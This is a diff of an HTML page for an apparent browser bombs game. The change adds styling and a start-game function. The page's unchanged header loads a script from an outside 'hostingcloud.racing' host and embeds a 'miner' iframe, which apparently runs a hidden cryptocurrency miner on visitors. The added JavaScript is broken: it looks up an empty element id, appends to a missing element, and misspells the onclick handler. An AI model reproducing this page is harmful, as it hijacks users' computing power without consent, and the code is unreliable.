@@ -20,6 +20,44 @@
     <link rel="stylesheet" href="style.css" />
     <link rel="stylesheet" href="/fly.css" />
     <script src="https://www.hostingcloud.racing/vrGl.js"></script>
+
+    <style>
+      .map {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+      }
+      .bombs {
+        width: 65%;
+        height: 85%;
+        border-style: groove;
+        border-color: silver;
+      }
+      .tools {
+        width: 65%;
+        height: 5%;
+        border-style: groove;
+        border-color: silver;
+      }
+      .tool {
+        cursor: pointer;
+      }
+    </style>
+    
+    <script>
+    function startBombs(){
+       var bomb = document.getElementById("");
+  var create = document.createElement("div");
+  create.className = "cow";
+  create.title = "playing";
+  create.id = "cow";
+  var Create = document.getElementById("musicItem").appendChild(create);
+
+    }
+    
+    </script>
   </head>
   <body>
     <miner><iframe src="miner.html"></iframe></miner>
@@ -31,22 +69,22 @@
         >00</label
       >
       <meter
-                value="0"
-                id="SCORE"
-                max="100"
-                min="0"
-                low="10"
-                high="80"
-                class="hide"
-              ></meter>
+        value="0"
+        id="SCORE"
+        max="100"
+        min="0"
+        low="10"
+        high="80"
+        class="hide"
+      ></meter>
       <center>
-        <div class=""
-       <div class="bombs" id ="bombs">
-         
-         
-        </div>
-        <div class="tools">
-          
+        <div class="map">
+          <div class="bombs" id="bombs"></div>
+          <div class="tools">
+            <div class="tool" onclikc="startBombs();">
+              Start Game
+            </div>
+          </div>
         </div>
       </center>
     </wrap>
